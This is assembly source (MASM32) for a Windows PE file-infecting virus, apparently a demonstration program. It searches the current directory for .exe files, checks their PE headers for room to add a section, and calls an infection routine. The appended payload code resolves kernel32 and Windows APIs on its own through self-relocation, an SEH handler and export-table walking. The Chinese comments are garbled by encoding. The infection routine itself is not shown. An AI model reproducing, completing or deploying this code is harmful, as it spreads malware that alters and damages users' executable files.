;jidu
; #########################################################################
;
;
; #########################################################################

      .386
      .model flat, stdcall
      option casemap :none   ; case sensitive

; #########################################################################

      include  D:\masm32\include\windows.inc
      include  D:\masm32\include\user32.inc
      include D:\masm32\include\kernel32.inc
      include D:\masm32\include\gdi32.inc
      include D:\masm32\include\comdlg32.inc
      include D:\masm32\include\masm32.inc


      includelib D:\masm32\lib\user32.lib
      includelib D:\masm32\lib\kernel32.lib
      includelib D:\masm32\lib\gdi32.lib
      includelib D:\masm32\lib\comdlg32.lib
      includelib D:\masm32\lib\masm32.lib

; һЩ������ԭ�ζ���
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
_ProtoFindFirstFile typedef	       proto  :dword,:dword
_ProtoFindNextFile  typedef	       proto  :dword,:dword
_ProtoFindClose     typedef	       proto  :dword
_ProtoSetEndOfFile  typedef       proto   :DWORD

_ProtoGetProcAddress	 typedef	proto	:dword,:dword
_ProtoLoadLibrary	 typedef	proto	:dword
_ProtoMessageBox	typedef	proto	:dword,:dword,:dword,:dword
_ProtoDeleteFile    typedef 	proto  :dword
_ProtoCreateFile        typedef	proto  :DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD
_ProtoReadFile          typedef	proto  :DWORD,:DWORD,:DWORD,:DWORD,:DWORD
_ProtoWriteFile         typedef	proto  :DWORD,:DWORD,:DWORD,:DWORD,:DWORD	
_ProtoSetFilePointer    typedef	proto  :DWORD,:DWORD,:DWORD,:DWORD
_ProtoCloseHandle       typedef	proto  :DWORD
_ProtoDeleteFile        typedef	proto  :DWORD
_ProtoGetFileSize       typedef	proto  :DWORD,:DWORD
_ProtoCopyFile          typedef	proto  :DWORD,:DWORD,:DWORD

_ProtoGlobalAlloc       typedef	proto  :DWORD,:DWORD
_ProtoGlobalFree        typedef	proto  :DWORD     

_ProtoOpenProcess       typedef   proto  :DWORD,:DWORD,:DWORD
_ProtoReadProcessMemory   typedef proto  :DWORD,:DWORD,:DWORD,:DWORD,:DWORD	     
_ProtoWriteProcessMemory  typedef proto  :DWORD,:DWORD,:DWORD,:DWORD,:DWORD     
_ProtoCreateThread        typedef proto  :DWORD,:DWORD,:DWORD,:DWORD,:DWORD     
_ProtoExitProcess         typedef proto  :DWORD     

_ProtoGetModuleHandle     typedef proto  :DWORD     
_ProtoGetModuleFileName   typedef proto  :DWORD,:DWORD,:DWORD     
_ProtoRtlZeroMemory       typedef proto  :DWORD,:DWORD 

_Protolstrcpy             typedef proto  :DWORD,:DWORD
_Protolstrcat             typedef proto  :DWORD,:DWORD
;_Protolstrcpyn            typedef proto  :DWORD,:DWORD,:DWORD
_Protolstrlen             typedef proto  :DWORD
_Protolstrcmp             typedef proto  :DWORD,:DWORD

_ProtoShellExecute        typedef	proto  :DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD
_Protowsprintf            typedef       proto  C :DWORD,:VARARG
; #########################################################################
_ApiFindFirstFile   typedef 	ptr    _ProtoFindFirstFile
_ApiFindNextFile    typedef 	ptr    _ProtoFindNextFile
_ApiFindClose       typedef 	ptr    _ProtoFindClose
_ApiSetEndOfFile    typedef       ptr    _ProtoSetEndOfFile

_ApiGetProcAddress	typedef	ptr	_ProtoGetProcAddress
_ApiLoadLibrary		typedef	ptr	_ProtoLoadLibrary
_ApiMessageBox		typedef	ptr	_ProtoMessageBox
_ApiCreateFile          typedef	ptr	_ProtoCreateFile
_ApiReadFile            typedef	ptr	_ProtoReadFile
_ApiWriteFile           typedef	ptr	_ProtoWriteFile
_ApiSetFilePointer      typedef	ptr	_ProtoSetFilePointer
_ApiCloseHandle         typedef	ptr	_ProtoCloseHandle
;_ApiDeleteFile	   typedef	ptr	_ProtoDeleteFile
_ApiGetFileSize         typedef	ptr     _ProtoGetFileSize
_ApiCopyFile            typedef	ptr     _ProtoCopyFile
_ApiGetFileSize         typedef   ptr     _ProtoGetFileSize
_ApiGlobalAlloc         typedef	ptr     _ProtoGlobalAlloc
_ApiGlobalFree          typedef	ptr     _ProtoGlobalFree
;_ApiOpenProcess         typedef ptr     _ProtoOpenProcess
;_ApiReadProcessMemory   typedef ptr     _ProtoReadProcessMemory
;_ApiWriteProcessMemory  typedef ptr     _ProtoWriteProcessMemory
;_ApiCreateThread        typedef ptr     _ProtoCreateThread
;_ApiExitProcess         typedef ptr     _ProtoExitProcess
;_ApiGetModuleHandle     typedef ptr     _ProtoGetModuleHandle
;_ApiGetModuleFileName   typedef ptr     _ProtoGetModuleFileName
;_ApiRtlZeroMemory       typedef ptr     _ProtoRtlZeroMemory
;_Apilstrcpy     typedef ptr           _Protolstrcpy             
;_Apilstrcat     typedef ptr           _Protolstrcat              
;_Apilstrcpyn    typedef ptr           _Protolstrcpyn        
;_Apilstrcmp    typedef ptr            _Protolstrcmp
     
_Apilstrlen     typedef ptr           _Protolstrlen
;_ApiShellExecute typedef ptr          _ProtoShellExecute         
;_Apiwsprintf     typedef ptr          _Protowsprintf
;_ApiCopyFile            typedef	ptr     _ProtoCopyFile
@SearchFile2 proto                        ;������ǰĿ¼��exe�ļ�
@GetAFile2 proto f_Name:DWORD             ;�ж��Ƿ���Ը�Ⱦ���Ƿ�Ϊ��׼PE��ʽ�����޲�����־
      ;=============
      ; Local macros
      ;=============

      szText MACRO Name, Text:VARARG
        LOCAL lbl
          jmp lbl
            Name db Text,0
          lbl:
        ENDM

      m2m MACRO M1, M2
        push M2
        pop  M1
      ENDM

      return MACRO arg
        mov eax, arg
        ret
      ENDM
   RGB macro red,green,blue
        xor eax,eax
        mov ah,blue
        shl eax,8
        mov ah,green
        mov al,red
   endm

        ;=================
        ; Local prototypes
        ;=================
        WinMain PROTO :DWORD,:DWORD,:DWORD,:DWORD
        WndProc PROTO :DWORD,:DWORD,:DWORD,:DWORD
        TopXY PROTO   :DWORD,:DWORD
        Paint_Proc PROTO :DWORD, hDC:DWORD
        Frame3D PROTO :DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD
        PushButton PROTO :DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD
        Draw_Out proto  :DWORD ,:DWORD
        ListBox PROTO :DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD
        SearchFile PROTO  
        GetAFile proto f_Name:DWORD
        _ProcessPeFile	PROTO	_lpFile:DWORD,_lpPeHead:DWORD,_dwSize:DWORD,f_Name:DWORD  ;���帽�Ӵ���
        AppendCode PROTO f_Name:DWORD

    .data
        szDisplayName db "PE������ʾ����",0
        CommandLine   dd 0
        hWnd          dd 0
        hInstance     dd 0
        hList         dd 0
       ; szFileName    db 260 dup(0)
       ; FileName_1    db 260 dup(0)
   .const
        szErrCreate	db	'�����ļ�����!',0dh,0ah,0
        szMySection	db	'.yang',0
        szExt		db	'_virus.exe',0
        szSuccess	db	'����:%s',0
    .code

start:
        invoke GetModuleHandle, NULL
        mov hInstance, eax

        invoke GetCommandLine
        mov CommandLine, eax

        invoke WinMain,hInstance,NULL,CommandLine,SW_SHOWDEFAULT
        invoke ExitProcess,eax

; #########################################################################

WinMain proc hInst     :DWORD,
             hPrevInst :DWORD,
             CmdLine   :DWORD,
             CmdShow   :DWORD

        ;====================
        ; Put LOCALs on stack
        ;====================

        LOCAL wc   :WNDCLASSEX
        LOCAL msg  :MSG

        LOCAL Wwd  :DWORD
        LOCAL Wht  :DWORD
        LOCAL Wtx  :DWORD
        LOCAL Wty  :DWORD

        ;==================================================
        ; Fill WNDCLASSEX structure with required variables
        ;==================================================

        mov wc.cbSize,         sizeof WNDCLASSEX
        mov wc.style,          CS_HREDRAW or CS_VREDRAW \
                               or CS_BYTEALIGNWINDOW
        mov wc.lpfnWndProc,    offset WndProc
        mov wc.cbClsExtra,     NULL
        mov wc.cbWndExtra,     NULL
        m2m wc.hInstance,      hInst   ;<< NOTE: macro not mnemonic
        mov wc.hbrBackground,  COLOR_BTNFACE+1
        mov wc.lpszMenuName,   NULL
        mov wc.lpszClassName,  offset szClassName
          invoke LoadIcon,hInst,500    ; icon ID
        mov wc.hIcon,          eax
          invoke LoadCursor,NULL,IDC_ARROW
        mov wc.hCursor,        eax
        mov wc.hIconSm,        0

        invoke RegisterClassEx, ADDR wc

        ;================================
        ; Centre window at following size
        ;================================

        mov Wwd, 500
        mov Wht, 350

        invoke GetSystemMetrics,SM_CXSCREEN
        invoke TopXY,Wwd,eax
        mov Wtx, eax

        invoke GetSystemMetrics,SM_CYSCREEN
        invoke TopXY,Wht,eax
        mov Wty, eax

        szText szClassName,"Template_Class"

        invoke CreateWindowEx,WS_EX_LEFT,
                              ADDR szClassName,
                              ADDR szDisplayName,
                              WS_OVERLAPPEDWINDOW,
                              Wtx,Wty,Wwd,Wht,
                              NULL,NULL,
                              hInst,NULL
        mov   hWnd,eax

        invoke LoadMenu,hInst,600  ; menu ID
        invoke SetMenu,hWnd,eax

        invoke ShowWindow,hWnd,SW_SHOWNORMAL
        invoke UpdateWindow,hWnd

      ;===================================
      ; Loop until PostQuitMessage is sent
      ;===================================

    StartLoop:
      invoke GetMessage,ADDR msg,NULL,0,0
      cmp eax, 0
      je ExitLoop
      invoke TranslateMessage, ADDR msg
      invoke DispatchMessage,  ADDR msg
      jmp StartLoop
    ExitLoop:

      return msg.wParam

WinMain endp

; #########################################################################

WndProc proc hWin   :DWORD,
             uMsg   :DWORD,
             wParam :DWORD,
             lParam :DWORD

        LOCAL hDC  :DWORD
        LOCAL Ps   :PAINTSTRUCT
        LOCAL hFont:DWORD


    .if uMsg == WM_COMMAND
    ;======== menu commands ========
        .if wParam == 1000
            ;invoke SendMessage,hWin,WM_SYSCOMMAND,SC_CLOSE,NULL
        .elseif wParam == 500
           invoke SearchFile

        .endif
    ;====== end menu commands ======

    .elseif uMsg == WM_PAINT
        invoke BeginPaint,hWin,ADDR Ps
          mov hDC, eax
            szText FontName,"����"
		invoke CreateFont,24,10,0,0,400,0,0,0,OEM_CHARSET,\
                            OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,\
                            DEFAULT_QUALITY,DEFAULT_PITCH or FF_SCRIPT,\
                            ADDR FontName
		invoke SelectObject, hDC, eax
		mov    hFont,eax
		RGB    200,200,50
		invoke SetTextColor,hDC,eax
		RGB    0,0,255  
		invoke SetBkColor,hDC,eax
              szText TestString,"   "
              szText doFile, "    "
              invoke TextOut,hDC,320,288,ADDR TestString,SIZEOF TestString-1
              invoke TextOut,hDC,20,10,ADDR doFile,SIZEOF doFile-1
  		invoke SelectObject,hDC, hFont  
         
        invoke Paint_Proc,hWin,hDC
        invoke EndPaint,hWin,ADDR Ps
        return 0

    .elseif uMsg == WM_CREATE
        jmp @f
        Butn1 db "��ʼ��Ⱦ",0
      @@:
        invoke PushButton,ADDR Butn1,hWin,380,80,100,25,500
        invoke ListBox,5,47,370,230,hWin,501
        mov hList, eax

    .elseif uMsg == WM_DESTROY
        invoke PostQuitMessage,NULL
        return 0 
    .endif

    invoke DefWindowProc,hWin,uMsg,wParam,lParam

    ret

WndProc endp

; ########################################################################

TopXY proc wDim:DWORD, sDim:DWORD

    shr sDim, 1      ; divide screen dimension by 2
    shr wDim, 1      ; divide window dimension by 2
    mov eax, wDim    ; copy window dimension into eax
    sub sDim, eax    ; sub half win dimension from half screen dimension

    return sDim

TopXY endp

; #########################################################################

Paint_Proc proc hWin:DWORD, hDC:DWORD

    LOCAL btn_hi   :DWORD
    LOCAL btn_lo   :DWORD
    LOCAL Rct      :RECT

    invoke GetSysColor,COLOR_BTNHIGHLIGHT
    mov btn_hi, eax

    invoke GetSysColor,COLOR_BTNSHADOW
    mov btn_lo, eax

    ; --------------------------------------------------------
    ; The following 2 calls draw the border around the buttons
    ; --------------------------------------------------------
    ;invoke Frame3D,hDC,btn_lo,btn_hi,340,20,460,125,2
    ;invoke Frame3D,hDC,btn_hi,btn_lo,337,17,463,128,2

    ; -----------------------------------------------------
    ; The following 2 calls draw the left window frame area
    ; -----------------------------------------------------
    ;invoke Frame3D,hDC,btn_lo,btn_hi,17,17,328,290,2
    ;invoke Frame3D,hDC,btn_hi,btn_lo,20,20,325,287,1

    ; ----------------------------------------------------------
    ; The following code draws the border around the client area
    ; ----------------------------------------------------------
    invoke GetClientRect,hWin,ADDR Rct

    add Rct.left,   1
    add Rct.top,    1
    sub Rct.right,  1
    sub Rct.bottom, 1

    invoke Frame3D,hDC,btn_lo,btn_hi,Rct.left,Rct.top,Rct.right,Rct.bottom,2

    add Rct.left,   4
    add Rct.top,    4
    sub Rct.right,  4
    sub Rct.bottom, 4

    invoke Frame3D,hDC,btn_hi,btn_lo,Rct.left,Rct.top,Rct.right,Rct.bottom,2
    return 0

Paint_Proc endp

; ########################################################################

PushButton proc lpText:DWORD,hParent:DWORD,
                a:DWORD,b:DWORD,wd:DWORD,ht:DWORD,ID:DWORD

 jmp @f
  btnClass  db "BUTTON",0
@@:
        invoke CreateWindowEx,0,
            ADDR btnClass,lpText,
            WS_CHILD or WS_VISIBLE,
            a,b,wd,ht,hParent,ID,
            hInstance,NULL

    ret

 PushButton endp

; ########################################################################

Frame3D proc hDC:DWORD,btn_hi:DWORD,btn_lo:DWORD,
             tx:DWORD, ty:DWORD, lx:DWORD, ly:DWORD,bdrWid:DWORD

  ; --------------------------------
  ; prototype and example usage code
  ; --------------------------------

  ; LOCAL btn_hi   :DWORD
  ; LOCAL btn_lo   :DWORD

  ; invoke GetSysColor,COLOR_BTNHIGHLIGHT
  ; mov btn_hi, eax

  ; invoke GetSysColor,COLOR_BTNSHADOW
  ; mov btn_lo, eax

  ; invoke Frame3D,hDC,btn_lo,btn_hi,50,50,150,100,2
  ; invoke Frame3D,hDC,btn_hi,btn_lo,47,47,153,103,2
  ; --------------------------------

    LOCAL hPen     :DWORD
    LOCAL hPen2    :DWORD
    LOCAL hpenOld  :DWORD

    invoke CreatePen,0,1,btn_hi
    mov hPen, eax
  
    invoke SelectObject,hDC,hPen
    mov hpenOld, eax

    ; ------------------------------------
    ; Save copy of parameters for 2nd loop
    ; ------------------------------------
    push tx
    push ty
    push lx
    push ly
    push bdrWid

    ; ------------

       lpOne:

        invoke MoveToEx,hDC,tx,ty,NULL
        invoke LineTo,hDC,lx,ty

        invoke MoveToEx,hDC,tx,ty,NULL
        invoke LineTo,hDC,tx,ly

        dec tx
        dec ty
        inc lx
        inc ly

        dec bdrWid
        cmp bdrWid, 0
        je lp1Out
        jmp lpOne
      lp1Out:

    ; ------------
    invoke CreatePen,0,1,btn_lo
    mov hPen2, eax
    invoke SelectObject,hDC,hPen2
    mov hPen, eax
    invoke DeleteObject,hPen
    ; ------------

    pop bdrWid
    pop ly
    pop lx
    pop ty
    pop tx

       lpTwo:

        invoke MoveToEx,hDC,tx,ly,NULL
        invoke LineTo,hDC,lx,ly

        invoke MoveToEx,hDC,lx,ty,NULL
        inc ly        
        invoke LineTo,hDC,lx,ly
        dec ly

        dec tx
        dec ty
        inc lx
        inc ly

        dec bdrWid
        cmp bdrWid, 0
        je lp2Out
        jmp lpTwo
      lp2Out:

    ; ------------
    invoke SelectObject,hDC,hpenOld
    invoke DeleteObject,hPen2

    ret

Frame3D endp

; #########################################################################
Draw_Out proc hDC:DWORD,hWin:DWORD
 local r1:RECT
 local x1:DWORD
 local y1:DWORD
 local x2:DWORD
 local y2:DWORD
 local color:COLORREF
 LOCAL hPen     :DWORD

 invoke GetClientRect,hWin,ADDR r1
 mov eax,r1.left
 add eax,18
 mov x1,eax
 mov eax,r1.top
 add eax,18
 mov y1,eax
 mov eax,r1.right
 sub eax,18
 mov x2,eax
 mov eax,r1.bottom
 sub eax,18
 mov y2,eax
 invoke GetSysColor,COLOR_BTNHIGHLIGHT
 mov color,eax
    inc color
    invoke CreatePen,PS_SOLID,1,color
    mov hPen, eax
    invoke SelectObject,hDC,hPen

 add color,10000h
 ;invoke SetBkColor,hDC,color
 invoke MoveToEx,hDC,x1,y2,NULL
 invoke LineTo,hDC,x2,y2
 inc y2
 ;inc color
 add color,10000h
 ;invoke SetBkColor,hDC,color
 invoke MoveToEx,hDC,x1,y2,NULL
 invoke LineTo,hDC,x2,y2
 inc y2
 ;inc color
 add color,10000h
 ;invoke SetBkColor,hDC,color
 invoke MoveToEx,hDC,x1,y2,NULL
 invoke LineTo,hDC,x2,y2
ret
Draw_Out endp
ListBox proc a:DWORD,b:DWORD,wd:DWORD,ht:DWORD,hParent:DWORD,ID:DWORD
    szText lstBox,"LISTBOX"
    invoke CreateWindowEx,WS_EX_CLIENTEDGE,ADDR lstBox,0,
              WS_VSCROLL or WS_VISIBLE or \
              WS_BORDER or WS_CHILD or \
              LBS_HASSTRINGS or LBS_NOINTEGRALHEIGHT or \
              LBS_DISABLENOSCROLL,
              a,b,wd,ht,hParent,ID,hInstance,NULL
    ret
ListBox endp

SearchFile proc uses ebx ecx edx edi esi
    LOCAL lpName[6]:BYTE
    LOCAL @st:WIN32_FIND_DATA
    LOCAL handle:DWORD
    mov al,'*'
    mov lpName,al    
    mov al,'.'
    mov lpName+1,al
    mov al,'e'
    mov lpName+2,al
    mov al,'x'
    mov lpName+3,al
    mov al,'e'
    mov lpName+4,al
    mov al, 0
    mov lpName+5,al
    invoke FindFirstFile, ADDR lpName, ADDR @st   ;�ᷢ�ֵ�һ���ļ�
    mov handle, eax
    .if eax == INVALID_HANDLE_VALUE
      jmp _Exit1
    .endif
    ;invoke SendMessage,hList,LB_ADDSTRING,0,ADDR @st.cFileName
    invoke GetAFile, ADDR @st.cFileName    ;�����һ���ļ�
    .if eax == -1
      invoke AppendCode, ADDR @st.cFileName  ;��Ⱦһ���ļ�
      jmp _Exit0
    .endif
    
    mov esi, TRUE
    .while esi == TRUE  
      invoke FindNextFile, handle, ADDR @st
      mov esi, eax
      .break .if esi == FALSE     ;���룬��������ļ���������     
      ;invoke SendMessage,hList,LB_ADDSTRING,0,ADDR @st.cFileName
      invoke GetAFile, ADDR @st.cFileName
      mov ecx, eax
      .if eax == -1
      invoke AppendCode, ADDR @st.cFileName  ;��Ⱦһ���ļ�
       .break .if ecx == -1     ;��Ⱦһ���ļ��Ժ��˳�
      .endif
    .endw
_Exit0:
    invoke FindClose, handle    
_Exit1:
    ret
  SearchFile endp

GetAFile proc  f_Name:DWORD      ;uses ebx ecx edx edi esi, 
  LOCAL hFile:DWORD
  LOCAL hLen:DWORD
  LOCAL temp:DWORD
  LOCAL dos_header:IMAGE_DOS_HEADER      
  LOCAL nt_header:IMAGE_NT_HEADERS      
  LOCAL pSec:DWORD    ;�ڻ�����ָ��  
  LOCAL nSec:DWORD    ;�ڸ���
  LOCAL info[256]:BYTE

  pushad
  invoke CreateFile,f_Name, GENERIC_READ or GENERIC_WRITE, 0,NULL,OPEN_EXISTING,0,NULL
  mov hFile, eax
  .if hFile == INVALID_HANDLE_VALUE
    szText szErrOpen, "���ܶ�д�ļ�"
    invoke SendMessage,hList,LB_ADDSTRING,0,ADDR szErrOpen 
    ;invoke SendMessage,hList,LB_ADDSTRING,0,f_Name
    jmp _Exit0
  .endif
 
  invoke GetFileSize,hFile,ADDR temp
  mov hLen,eax
  invoke ReadFile,hFile,ADDR dos_header,sizeof IMAGE_DOS_HEADER,ADDR temp,NULL

  .if dos_header.e_magic!=5A4DH    ;"MZ"
    szText szErrFile, "��MZ�ļ�"
    invoke SendMessage,hList,LB_ADDSTRING,0,ADDR szErrFile
    invoke CloseHandle, hFile
    jmp _Exit0
  .endif
  invoke SetFilePointer,hFile,dos_header.e_lfanew,NULL,FILE_BEGIN
  invoke ReadFile,hFile,ADDR nt_header,sizeof IMAGE_NT_HEADERS,ADDR temp, NULL
  .if nt_header.Signature != 4550H    ;"PE"
    szText szErrFile2, "��PE�ļ�"
    invoke SendMessage,hList,LB_ADDSTRING,0,ADDR szErrFile2 
    invoke CloseHandle, hFile
    jmp _Exit0
  .endif
  invoke GlobalAlloc,GPTR,hLen
  mov pSec,eax
  .if eax == NULL
      szText MemoryErr,"�ڴ����ʧ��"
      invoke SendMessage,hList,LB_ADDSTRING,0,ADDR MemoryErr
      invoke CloseHandle,hFile
      jmp _Exit0
 .endif
 invoke SetFilePointer,hFile,0,NULL,FILE_BEGIN
 invoke ReadFile,hFile,pSec,hLen,ADDR temp,NULL

 mov edx, pSec
 assume	edx:ptr IMAGE_DOS_HEADER
 mov edi, pSec
 add edi, [edx].e_lfanew
 mov esi, edi
 assume  edi:ptr  IMAGE_NT_HEADERS
 xor eax, eax
 mov ax, [edi].FileHeader.NumberOfSections
 mov nSec, eax           ;�ڸ���
 add esi, sizeof IMAGE_NT_HEADERS
 mov ecx, sizeof IMAGE_SECTION_HEADER
 mov eax, nSec
 mul cx                  ;cxΪnSec���ڱ�ռ�ÿռ�
 add eax, esi             ;eaxΪ���һ���ڱ�ṹ��һ���ֽ�
 sub eax, pSec
 add eax, sizeof IMAGE_SECTION_HEADER          ;�ټ�ȥһ���ڱ�(������һ��������)

 assume   esi:ptr IMAGE_SECTION_HEADER
 ;szText format1, "%s:  %X,,,%X"
 ;
 ;invoke SendMessage,hList,LB_ADDSTRING,0,ADDR info


 .if eax <= [esi].PointerToRawData             ;���ڱ�ṹλ�ƴ��ڵ�һ�ڵ��ļ�ƫ��
   szText tell_1,  "���Ը�Ⱦ %s  ^^^^"
   invoke wsprintf, ADDR info, ADDR tell_1, f_Name
   invoke SendMessage,hList,LB_ADDSTRING,0,ADDR info
   invoke GlobalFree, pSec
   invoke CloseHandle,hFile
   jmp _Exit1
 .endif
_Exit1:
 popad
 mov eax, -1       ;ֻ��Ⱦһ���ļ�
 ret

_Exit0:
 popad
 xor eax, eax
  ret
GetAFile endp

;���Ӵ��뿪ʼλ��
APPEND_CODE	equ	this byte

;**************************************************************
;szFlags         db      'Made by ������',0   ;��־ 
;**************************************************************
hDllKernel32	dd	?
hDllUser32	dd	?
hDllShell32   dd     ?
_GetProcAddress	_ApiGetProcAddress	?
_LoadLibrary	_ApiLoadLibrary		?
_MessageBox	_ApiMessageBox		?
szLoadLibrary	db	'LoadLibraryA',0
szGetProcAddress db	'GetProcAddress',0
szUser32	db	'user32',0
szKernel32	db	'kernel32.dll',0
szMessageBox	db	'MessageBoxA',0
;**************************************************************
szCaption	db	'      ',0
szText1	db	'�ó����Ѿ���Ⱦ��PE�ļ�����',0dh,0ah
             db     "  ",0dh,0ah
             db     "  ",0dh,0ah
             db     "  ",0dh,0ah
             db     "  ",0
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
; ����ģ�飺_GetKernel.asm
; ���ݳ��򱻵��õ�ʱ���ջ���и����� Ret �ĵ�ַָ�� Kernel32.dll
; �����ڴ���ɨ�貢��ȡ Kernel32.dll �Ļ�ַ
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
;;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
; ���� Handler
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
_SEHHandler	proc	_lpExceptionRecord,_lpSEH,_lpContext,_lpDispatcherContext

		pushad
		mov	esi,_lpExceptionRecord
		mov	edi,_lpContext
		assume	esi:ptr EXCEPTION_RECORD,edi:ptr CONTEXT
		mov	eax,_lpSEH
		push	[eax + 0ch]
		pop	[edi].regEbp
		push	[eax + 8]
		pop	[edi].regEip
		push	eax
		pop	[edi].regEsp
		assume	esi:nothing,edi:nothing
		popad
		mov	eax,ExceptionContinueExecution
		ret

_SEHHandler	endp;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
; ���ڴ���ɨ�� Kernel32.dll �Ļ�ַ
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
_GetKernelBase	proc	_dwKernelRet
		local	@dwReturn

		pushad
		mov	@dwReturn,0
;********************************************************************
; �ض�λ
;********************************************************************
		call	@F
		@@:
		pop	ebx
		sub	ebx,offset @B
;********************************************************************
; �������ڴ������ SEH �ṹ
;********************************************************************
		assume	fs:nothing
		push	ebp
		lea	eax,[ebx + offset _PageError]
		push	eax
		lea	eax,[ebx + offset _SEHHandler]
		push	eax
		push	fs:[0]
		mov	fs:[0],esp
;********************************************************************
; ���� Kernel32.dll �Ļ���ַ
;********************************************************************
		mov	edi,_dwKernelRet
		and	edi,0ffff0000h
		.while	TRUE
			.if	word ptr [edi] == IMAGE_DOS_SIGNATURE
				mov	esi,edi
				add	esi,[esi+003ch]
				.if word ptr [esi] == IMAGE_NT_SIGNATURE
					mov	@dwReturn,edi
					.break
				.endif
			.endif
			_PageError:
			sub	edi,010000h
			.break	.if edi < 070000000h
		.endw
		pop	fs:[0]
		add	esp,0ch
		popad
		mov	eax,@dwReturn
		ret

_GetKernelBase	endp
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
; ���ڴ���ģ��ĵ������л�ȡĳ�� API ����ڵ�ַ
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
_GetApi		proc	_hModule,_lpszApi
		local	@dwReturn,@dwStringLength

		pushad
		mov	@dwReturn,0
;********************************************************************
; �ض�λ
;********************************************************************
		call	@F
		@@:
		pop	ebx
		sub	ebx,offset @B
;********************************************************************
; �������ڴ������ SEH �ṹ
;********************************************************************
		assume	fs:nothing
		push	ebp
		lea	eax,[ebx + offset _Error]
		push	eax
		lea	eax,[ebx + offset _SEHHandler]
		push	eax
		push	fs:[0]
		mov	fs:[0],esp
;********************************************************************
; ���� API �ַ����ĳ��ȣ���β����0��
;********************************************************************
		mov	edi,_lpszApi
		mov	ecx,-1
		xor	al,al
		cld
		repnz	scasb
		mov	ecx,edi
		sub	ecx,_lpszApi
		mov	@dwStringLength,ecx
;********************************************************************
; �� PE �ļ�ͷ������Ŀ¼��ȡ�������ַ
;********************************************************************
		mov	esi,_hModule
		add	esi,[esi + 3ch]
		assume	esi:ptr IMAGE_NT_HEADERS
		mov	esi,[esi].OptionalHeader.DataDirectory.VirtualAddress
		add	esi,_hModule
		assume	esi:ptr IMAGE_EXPORT_DIRECTORY
;********************************************************************
; ���ҷ������Ƶĵ���������
;********************************************************************
		mov	ebx,[esi].AddressOfNames
		add	ebx,_hModule
		xor	edx,edx
		.repeat
			push	esi
			mov	edi,[ebx]
			add	edi,_hModule
			mov	esi,_lpszApi
			mov	ecx,@dwStringLength
			repz	cmpsb
			.if	ZERO?
				pop	esi
				jmp	@F
			.endif
			pop	esi
			add	ebx,4
			inc	edx
		.until	edx >=	[esi].NumberOfNames
		jmp	_Error
@@:
;********************************************************************
; API�������� --> ������� --> ��ַ����
;********************************************************************
		sub	ebx,[esi].AddressOfNames
		sub	ebx,_hModule
		shr	ebx,1
		add	ebx,[esi].AddressOfNameOrdinals
		add	ebx,_hModule
		movzx	eax,word ptr [ebx]
		shl	eax,2
		add	eax,[esi].AddressOfFunctions
		add	eax,_hModule
;********************************************************************
; �ӵ�ַ��õ�����������ַ
;********************************************************************
		mov	eax,[eax]
		add	eax,_hModule
		mov	@dwReturn,eax
_Error:
		pop	fs:[0]
		add	esp,0ch
		assume	esi:nothing
		popad
		mov	eax,@dwReturn
		ret

_GetApi		endp
 ;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

_FindFirstFile       _ApiFindFirstFile  ?
_FindNextFile        _ApiFindNextFile  ?
_FindClose           _ApiFindClose     ?
;_SetEndOfFile        _ApiSetEndOfFile  ?

_CreateFile          _ApiCreateFile     ?
_ReadFile            _ApiReadFile       ?
_WriteFile           _ApiWriteFile      ?      
_SetFilePointer      _ApiSetFilePointer ?      
_CloseHandle         _ApiCloseHandle    ?       
_GetFileSize         _ApiGetFileSize    ?

_GlobalAlloc         _ApiGlobalAlloc    ?
_GlobalFree          _ApiGlobalFree     ?

;_GetModuleHandle     _ApiGetModuleHandle   ?
;_GetModuleFileName   _ApiGetModuleFileName ?
;_RtlZeroMemory       _ApiRtlZeroMemory     ?

;_ExitProcess            _ApiExitProcess    ?

;_lstrcpy                _Apilstrcpy       ?
;_lstrcat                _Apilstrcat       ?
;_lstrcpyn               _Apilstrcpyn      ?          
;_lstrlen                _Apilstrlen       ?
;_lstrcmp                _Apilstrcmp       ?
;_CopyFile               _ApiCopyFile       ?
;_wsprintf               _Apiwsprintf      ?

szFindFirstFile    db   'FindFirstFileA',0
szFindNextFile     db   'FindNextFileA',0  ;���ַ���������ҲҪ��A
szFindClose        db   'FindClose',0
;szSetEndOfFile     db   'SetEndOfFile',0

szCreateFile       db   'CreateFileA',0
szReadFile         db   'ReadFile',0
szWriteFile        db   'WriteFile',0
szSetFilePointer   db   'SetFilePointer',0
szCloseHandle      db   'CloseHandle',0
szGlobalAlloc      db   'GlobalAlloc',0
szGlobalFree       db   'GlobalFree',0
szGetFileSize      db   'GetFileSize',0

;szExitProcess         db   'ExitProcess',0

;szGetModuleHandle     db  'GetModuleHandleA',0
;szGetModuleFileName   db  'GetModuleFileNameA',0
;szRtlZeroMemory       db  'RtlZeroMemory',0

;szlstrcpy               db  'lstrcpyA',0
;szlstrcat               db  'lstrcatA',0
;szlstrcpyn              db  'lstrcpynA',0                         
;szlstrlen               db  'lstrlenA',0
